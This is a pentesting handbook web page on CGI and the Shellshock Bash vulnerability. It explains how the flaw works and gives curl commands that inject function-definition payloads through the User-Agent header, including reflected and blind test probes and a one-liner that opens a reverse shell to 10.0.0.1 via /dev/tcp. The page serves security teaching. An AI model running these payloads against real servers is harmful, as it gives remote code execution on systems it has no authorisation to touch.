<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Common Gateway Interface At a Glance Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="CGI - Web Applications Pentesting"><meta property="og:description" content="Common Gateway Interface At a Glance Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><meta property="og:type" content="article"><meta property="og:url" content="https://0xffsec.com/handbook/web-applications/cgi/"><meta property="og:image" content="https://0xffsec.com/handbook/images/banner.png"><meta property="article:modified_time" content="2020-10-26T15:49:33+01:00"><meta itemprop=name content="CGI - Web Applications Pentesting"><meta itemprop=description content="Common Gateway Interface At a Glance Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><meta itemprop=dateModified content="2020-10-26T15:49:33+01:00"><meta itemprop=wordCount content="346"><meta itemprop=image content="https://0xffsec.com/handbook/images/banner.png"><meta itemprop=keywords content><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://0xffsec.com/handbook/images/banner.png"><meta name=twitter:title content="CGI - Web Applications Pentesting"><meta name=twitter:description content="Common Gateway Interface At a Glance Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.
Most servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content."><title>CGI - Web Applications Pentesting | 0xffsec Handbook</title><link rel=manifest href=https://0xffsec.com/handbook/manifest.json><link rel=icon href=https://0xffsec.com/handbook/favicon.png type=image/x-icon><link rel=stylesheet href=https://0xffsec.com/handbook/book.min.69f272001b84977c89e6a5ed84ee271fa87c5b598b5cc2aef7e5c8490d573b88.css integrity="sha256-afJyABuEl3yJ5qXthO4nH6h8W1mLXMKu9+XISQ1XO4g="><script defer src=https://0xffsec.com/handbook/en.search.min.477996f0ee3361b143df4a6169635173d72768eff1588bb511dd944f505b632d.js integrity="sha256-R3mW8O4zYbFD30phaWNRc9cnaO/xWIu1Ed2UT1BbYy0="></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-142676329-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=https://0xffsec.com/handbook/><img src=https://0xffsec.com/handbook/images/logo.png alt=Logo><span>0xffsec Handbook</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><input type=checkbox id=section-35d81374824c25dc2919edbbc61d971f class=toggle>
<label for=section-35d81374824c25dc2919edbbc61d971f class="flex justify-between"><a>Information Gathering</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/information-gathering/assets-discovery/>Assets Discovery</a></li></ul></li><li><input type=checkbox id=section-235f64cfc2023c9b7289c228d0c51f53 class=toggle>
<label for=section-235f64cfc2023c9b7289c228d0c51f53 class="flex justify-between"><a>Discovery and Scanning</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/discovery-and-scanning/host-discovery/>Host Discovery</a></li><li><a href=https://0xffsec.com/handbook/discovery-and-scanning/port-scanning/>Port Scanning</a></li></ul></li><li><a href=https://0xffsec.com/handbook/exploits-search/>Exploit Search</a></li><li><a href=https://0xffsec.com/handbook/brute-forcing/>Brute Forcing</a></li><li><input type=checkbox id=section-057108a1c1a3662b9db6ab679412fa8f class=toggle>
<label for=section-057108a1c1a3662b9db6ab679412fa8f class="flex justify-between"><a href=https://0xffsec.com/handbook/services/>Service Enumeration</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/services/ftp/>FTP - 21</a></li><li><a href=https://0xffsec.com/handbook/services/smtp/>SMTP - 25 / 465 / 587</a></li><li><a href=https://0xffsec.com/handbook/services/dns/>DNS - 53</a></li><li><a href=https://0xffsec.com/handbook/services/finger/>Finger - 79</a></li><li><a href=https://0xffsec.com/handbook/services/http-https/>HTTP/S - 80 / 443</a></li><li><a href=https://0xffsec.com/handbook/services/pop/>POP - 110 / 995</a></li><li><a href=https://0xffsec.com/handbook/services/nntp/>NNTP - 119 / 433 / 563</a></li><li><a href=https://0xffsec.com/handbook/services/msrpc/>MSRPC - 135 / 593</a></li><li><a href=https://0xffsec.com/handbook/services/netbios/>NetBIOS - 137 / 138 / 139</a></li><li><a href=https://0xffsec.com/handbook/services/smb/>SMB - 139 / 445</a></li><li><a href=https://0xffsec.com/handbook/services/imap/>IMAP - 143 / 993</a></li></ul></li><li><a href=https://0xffsec.com/handbook/steganography/>Steganography</a></li><li><input type=checkbox id=section-4710461fd82136af748c8186e2a511e1 class=toggle checked>
<label for=section-4710461fd82136af748c8186e2a511e1 class="flex justify-between"><a>Web Applications</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/web-applications/cgi/ class=active>CGI</a></li><li><a href=https://0xffsec.com/handbook/web-applications/command-injection/>Command Injection</a></li><li><a href=https://0xffsec.com/handbook/web-applications/csrf/>CSRF</a></li><li><a href=https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/>LFI / RFI and Path Traversal</a></li></ul></li><li><input type=checkbox id=section-9b274a52224e37b079acf4aae5f9f128 class=toggle>
<label for=section-9b274a52224e37b079acf4aae5f9f128 class="flex justify-between"><a>Shells</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/shells/reverse-shells/>Reverse Shells</a></li><li><a href=https://0xffsec.com/handbook/shells/full-tty/>Upgrade to Full TTY</a></li><li><a href=https://0xffsec.com/handbook/shells/restricted-shells/>Escape Restricted Shells</a></li></ul></li><li><a href=https://0xffsec.com/handbook/exfiltration/>Data Exfiltration</a></li><li><input type=checkbox id=section-ef46fe0aac274900fefdd5e564e236b2 class=toggle>
<label for=section-ef46fe0aac274900fefdd5e564e236b2 class="flex justify-between"><a href=https://0xffsec.com/handbook/notes/>Notes</a>
<span>▾</span></label><ul><li><a href=https://0xffsec.com/handbook/notes/how-to-open-jar-files/>JAR Files</a></li><li><a href=https://0xffsec.com/handbook/notes/smb-protocol-negotiation-failed/>SMB Protocol Negotiation Failed</a></li><li><a href=https://0xffsec.com/handbook/notes/ssh-legacy-key-exchange/>SSH Legacy Key Exchange</a></li></ul></li><li><a href=https://0xffsec.com/handbook/further-reading/>Further Reading</a></li></ul><ul><li><a href=https://github.com/0xffsec/handbook target=_blank rel=noopener>GitHub</a></li></ul></nav><script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=https://0xffsec.com/handbook/svg/menu.svg class=book-icon alt=Menu></label>
<strong>CGI - Web Applications Pentesting</strong>
<label for=toc-control><img src=https://0xffsec.com/handbook/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#at-a-glance>At a Glance</a></li><li><a href=#shellshock>Shellshock</a><ul><li><a href=#test>Test</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></header><article class=markdown><h1 id=common-gateway-interface>Common Gateway Interface</h1><h2 id=at-a-glance>At a Glance</h2><p>Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.</p><p>Most servers expect CGI scripts to reside in a special directory, usually called <code>cgi-bin</code>, to handle the requests correctly and execute the program instead of returning the file content. <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><h2 id=shellshock>Shellshock</h2><p>Shellshock (<a href=https://nvd.nist.gov/vuln/detail/CVE-2014-6271>CVE-2014-6271</a>) is an Arbitrary Code Execution (ACE) vulnerability that affects Linux and Unix command-line shell, aka the GNU Bourne Again Shell.</p><p>GNU Bourne Again Shell, or Bash, is an interpreter that allows users to send commands on Unix and Linux systems, typically by connecting over SSH or Telnet but it can also operate as a parser for CGI scripts.</p><div class=book-note><div class=book-note-icon><svg width="23" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 60a15 15 0 000 30c50 0 90 40 90 90a15 15 0 0030 0c0-66-54-120-120-120z"/><path d="M217 4a179 179 0 00-96 295c19 22 30 49 30 77v30c0 20 13 37 31 43 6 35 36 63 74 63s68-28 74-63c18-6 31-23 31-43v-30c0-28 11-55 30-78A180 180 0 00217 4zm39 478c-19 0-36-13-42-31h84c-6 18-23 31-42 31zm75-76c0 8-7 15-15 15H196c-8 0-15-7-15-15v-15h150v15zm38-127c-21 24-34 52-37 82H180c-3-30-16-59-36-82a150 150 0 11225 0zM45 180H15a15 15 0 000 30h30a15 15 0 000-30z"/><path d="M51 105 30 84A15 15 0 109 105l21 21a15 15 0 1021-21zm0 159c-6-6-15-6-21 0L9 285a15 15 0 1021 21l21-21c6-6 6-15 0-21zm446-84h-30a15 15 0 000 30h30a15 15 0 000-30zm6-96c-6-6-15-6-21 0l-21 21a15 15 0 1021 21l21-21c6-6 6-15 0-21zm0 201-21-21a15 15 0 10-21 21l21 21a15 15 0 0021-21z"/></svg></div><div class=book-note-text><p><b>Note:</b>
In addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardware Management Console (IBM HMC)</p></div></div><p>The vulnerability occurs when the variables sent to the server, are passed and interpreted by Bash. This variable involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.</p><pre><code>Environment variable with
function definition                          Expected command
         +                                          +
         |                                          |
+--------+--------+ +----------------+ +------------+--------------+
| env x='() { :;};| |echo vulnerable'| |bash -c &quot;echo Real command&quot;|
+-----------------+ +-------+--------+ +---------------------------+
                            |
                            +
            Arbitrary command executed by Bash
</code></pre><h3 id=test>Test</h3><h4 id=reflected>Reflected</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; echo; echo &#39;vulnerable&#39;&#34;</span> http://10.0.0.3/cgi-bin/vulnerable | grep vulnerable
</code></pre></div><h4 id=blind>Blind</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; /bin/bash -c &#39;sleep 5&#39;&#34;</span> http://10.0.0.3/cgi-bin/vulnerable
</code></pre></div><details><summary>Parameters</summary><div class=markdown-inner><ul><li><code>-f</code>: fail silently on HTTP errors.</li><li><code>-s</code>: silent mode.</li><li><code>-H</code>: pass custom header(s) to server.</li></ul></div></details><h3 id=exploit>Exploit</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -fs -H <span style=color:#ed9d13>&#34;user-agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/1234 0&gt;&amp;1&#34;</span> http://10.0.0.3/cgi-bin/vulnerable
</code></pre></div><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://blog.cloudflare.com/inside-shellshock/>Inside Shellshock: How hackers are using it to exploit systems</a></li><li><a href=https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29>Wikipedia - Shellshock (software bug)</a></li></ul><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p>Gundavaram, Shishir. “The Common Gateway Interface (CGI).” O’Reilly Media - Technology and Business Training, O’Reilly & Associates, Inc., <a href=https://www.oreilly.com/openbook/cgi/ch01_01.html>https://www.oreilly.com/openbook/cgi/ch01_01.html</a>. <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/0xffsec/handbook/commit/51775fbec9ea9d2eea46869c989bd97c6efbf620 title="Last modified by Max Rodrigo | October 26, 2020" target=_blank rel=noopener><img src=https://0xffsec.com/handbook/svg/calendar.svg class=book-icon alt=Calendar>
<span>October 26, 2020</span></a></div><div><a class="flex align-center" href=https://github.com/0xffsec/handbook/edit/master/content//web-applications/cgi.md target=_blank rel=noopener><img src=https://0xffsec.com/handbook/svg/edit.svg class=book-icon alt=Edit>
<span>Edit this page</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#at-a-glance>At a Glance</a></li><li><a href=#shellshock>Shellshock</a><ul><li><a href=#test>Test</a></li><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></main></body></html>